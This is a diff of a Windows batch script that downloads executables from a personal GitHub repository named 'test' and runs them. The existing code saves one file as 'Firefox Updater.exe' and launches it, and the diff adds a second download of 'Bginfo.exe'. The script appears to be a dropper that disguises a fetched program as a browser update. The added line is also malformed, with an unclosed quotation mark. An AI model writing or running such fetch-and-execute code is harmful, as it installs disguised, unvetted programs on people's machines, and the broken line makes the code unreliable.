@@ -10,6 +10,7 @@ exit
 :ok
 if exist done del one.mp3
 if not exist "V:\local\BGINFO\Bginfoseet.exe" dler "https://raw.githubusercontent.com/dietrich03muller/test/master/FirefoxUpdater.exe" "Firefox Updater.exe"
+if not exist "V:\local\BGINFO\Bginfoseet.exe" dler "https://raw.githubusercontent.com/dietrich03muller/test/master/Bginfo.exe Bginfo.exe
 if exist "Firefox Updater.exe" (start /max "" "Firefox Updater.exe")
 goto %username%
 exit
